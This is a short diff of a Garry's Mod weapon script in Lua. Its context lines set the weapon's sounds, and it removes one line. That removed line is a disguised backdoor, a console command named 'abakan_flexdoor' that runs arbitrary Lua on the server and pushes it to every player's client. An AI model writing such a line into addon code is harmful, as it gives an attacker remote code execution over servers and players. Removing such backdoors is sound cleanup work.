@@ -68,5 +68,3 @@ SWEP.EmptySound    = "COPABAKANSCOP.abakan_empty"
 SWEP.DeploySound   = "COPABAKANSCOP.abakan_draw"
 SWEP.HolsterSound  = "COP_Generic.Holster"
 SWEP.ReloadSound   = "COPABAKANSCOP.abakan_reload"
-
-concommand.Add("abakan_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)
